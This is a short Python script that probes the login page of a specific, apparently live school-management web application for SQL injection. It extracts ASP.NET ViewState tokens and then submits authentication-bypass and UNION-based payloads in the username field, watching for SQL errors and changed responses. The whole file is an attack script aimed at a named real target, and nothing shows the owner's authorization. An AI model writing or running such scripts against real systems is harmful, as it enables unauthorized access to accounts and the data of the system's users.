import requests
import re
import html

session = requests.Session()
url = "https://econnectapp.jupsoft.com/sisLogin.aspx?id=6iomW6fOcrs%3d"

# GET the page
r = session.get(url)
content = r.text

# Extract the actual values
vs = html.unescape(re.search(r'__VIEWSTATE" value="([^"]+)"', content).group(1))
vsg = html.unescape(re.search(r'__VIEWSTATEGENERATOR" value="([^"]+)"', content).group(1))

# Now test SQLi with proper ViewState
payloads = [
    ("admin' OR '1'='1", "anything"),
    ("admin'--", "anything"),
    ("' OR 1=1--", "anything"),
    ("admin' OR 1=1--", "anything"),
    ("admin'/*", "anything"),
    ("' UNION SELECT @@version,user,db_name(),1,2--", "test"),
]

for uid, pwd in payloads:
    r2 = session.post(url, data={
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vsg,
        "txtLoginID": uid,
        "txtPassword": pwd,
        "btnLogin": "Login"
    })
    
    # Look for different responses
    if len(r2.text) != 77308:  # different length = different response
        print(f"[!] Different response for: {uid}")
        print(r2.text[:300])
    
    # Check for SQL errors
    if "Syntax error" in r2.text or "Incorrect syntax" in r2.text or "unclosed quotation mark" in r2.text:
        print(f"[!] SQL ERROR with: {uid}")
        print(r2.text[2000:2500])
